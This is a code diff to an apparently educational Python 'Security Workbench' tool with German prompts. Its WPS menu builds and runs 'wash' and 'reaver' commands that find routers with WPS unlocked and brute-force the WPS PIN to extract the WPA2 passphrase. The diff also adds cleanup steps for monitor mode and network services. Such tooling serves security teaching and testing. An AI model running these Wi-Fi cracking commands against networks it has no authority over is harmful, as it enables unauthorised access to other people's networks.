@@ -59,13 +59,16 @@ def WPS_Menu():
 	
 		#CHECK WPS LOCK
 		print ('Nun beginnt der eigentliche Angriff:\n')
-		command = rlinput('Zuerst muss geprüft werden, ob der ausgewählte Router WPS unterstützt(Prüfen auf WPS-Locked: No): \n# ', 'wash -i ' + wifi_name + ' -c ' +router_chn + ' -C -s')
+		command = rlinput('Zuerst muss geprüft werden, ob der ausgewählte Router WPS unterstützt(Prüfen auf WPS-Locked: No): \n# ', 'wash -i ' + wifi_name + ' -c ' +router_chn + ' -s')
 		execute(command)
 
 		#CRACK WPA2-PSK
 		command = rlinput('Nun wird die WPS-PIN geknackt und der WPA2-PSK extrahiert: \n# ', 'reaver -i ' + wifi_name + ' -b ' +router_bssid )
 		execute(command)
-
+		
+		#Stop Monitor Mode
+                generics.stop_monitor_mode(wifi_name)
+		
 		#ReStart Networkmanager
                 generics.restart_networkmanager()
 
@@ -90,8 +93,11 @@ def WPS_Menu():
 
 
 def sql_signal_handler(signal, frame):
+	#Stop Monitor Mode
+	os.system('airmon-ng stop ' + used_interface)
 	#ReStart Networkmanager
-	os.system("service network-manager restart")
+	os.system("service networking stop && service network-manager stop")
+	os.system("service networking start && service network-manager start")
 	print('\n\n Die Security Workbench wird beendet ... \n')
 	sys.exit(0)
 
